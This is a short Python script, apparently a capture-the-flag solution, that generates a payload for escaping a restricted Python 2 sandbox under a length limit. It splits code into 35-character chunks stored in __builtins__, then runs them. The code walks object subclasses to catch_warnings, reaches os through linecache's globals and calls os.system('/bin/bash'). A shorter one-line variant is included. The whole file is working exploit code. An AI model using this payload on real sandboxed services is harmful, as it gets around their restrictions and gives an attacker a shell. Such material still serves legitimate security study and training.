#!/usr/bin/python

import sys
_input = ('A'*4+'B'*4+'C'*4+'D'*4+'E'*4)*4
index = 0
try:
	_input = sys.argv[1]
	index = sys.argv[2]
except IndexError:
	pass

print('__builtins__[{}]=[]'.format(index))
def split_code(code):
	s = '__builtins__[{}].append("'.format(index)
	n = len(s) + 2
	i = 0
	j = 35 - n
	while j < len(code):
		if code[i:j][-1] == '\\':
			print(s + code[i:j-1] + '")')
			split_code('\\' + code[j:])
			return
		print(s + code[i:j] + '")')
		buf = j
		j += (j-i)
		i = buf
	print(s + code[i:j] + '")')


def split_code2(code):
	s = '__builtins__[1]("'
	n = len(s) + 2
	i = 0
	j = 35 - n
	while j < len(code):
		if code[i:j][-1] == '\\':
			print(s + code[i:j-1] + '")')
			split_code2('\\' + code[j:])
			return
		print(s + code[i:j] + '")')
		buf = j
		j += (j-i)
		i = buf
	print(s + code[i:j] + '")')

l =\
[
	'def f(s):\\n\\t__builtins__[0]=__builtins__[0]+s[:35]\\n\\tprint(s[:35])\\n__builtins__[1]=f',
	'l=().__class__.__base__.__subclasses__()\\n',
	'i=0\\nfor s in l:\\n\\tprint(i,s)\\n\\ti=i+1\\n',
	"m=[x for x in l if x.__name__=='catch_warnings'][0]\\n",
	"print(m.__dict__)\\n",
	"n=m.__repr__.im_func.__globals__\\n",
	"for gl in n.keys():\\n\\tprint(gl,n[gl])\\n",
	"os=n['linecache'].os\\n",
	"os.system('/bin/bash')\\n"
]

split_code(l[0])
print('1;exec \'\'.join(__builtins__[0])')
print('__builtins__[0]=""')
for c in l[1:]:
	split_code2(c)
print('1;exec __builtins__[0]')

# Or shorter:
print("__builtins__[0]=[]")
code = "[x for x in ().__class__.__base__.__subclasses__() if x.__name__=='catch_warnings'][0].__repr__.im_func.__globals__['linecache'].os.system('/bin/bash')"
split_code(code)
print('1;exec \'\'.join(__builtins__[0])')

